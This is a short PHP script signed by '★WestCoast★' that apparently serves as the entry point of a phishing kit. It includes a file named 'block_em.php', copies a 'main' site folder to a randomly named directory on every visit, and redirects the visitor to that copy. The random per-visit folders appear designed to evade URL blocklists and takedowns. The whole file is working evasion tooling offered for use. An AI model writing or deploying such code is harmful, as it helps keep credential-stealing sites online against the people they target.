﻿<?php
	//  created by ★WestCoast★
	// 
	
	@error_reporting();
	
	require 'block_em.php';

	function genString() {
	    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_=&';
	    $randomString = '';
	    for ($i = 0; $i < 14; $i++) {
	        $randomString .= $characters[rand(0, strlen($characters) - 1)];
	    }
	    return $randomString;
	}

	$to = genString();

	function reCopy($origin, $place) {
		$dir = opendir($origin);
		$rsult = ($dir === false ? false : true);
		if ($rsult !== false) {
			$rsult = @mkdir($place);
			if ($rsult === true) {
				while(false !== ( $file = readdir($dir)) ) { 
					if (( $file != '.' ) && ( $file != '..' ) && $rsult) { 
						if ( is_dir($origin . '/' . $file) ) { 
							$rsult = reCopy($origin . '/' . $file,$place . '/' . $file); 
						} else { 
							$rsult = copy($origin . '/' . $file,$place . '/' . $file); 
						} 
					} 
				}
				closedir($dir);
			}
		}
		return $rsult;
	}

	reCopy( "main", $to );
	header("Location: {$to}");
	exit();

?>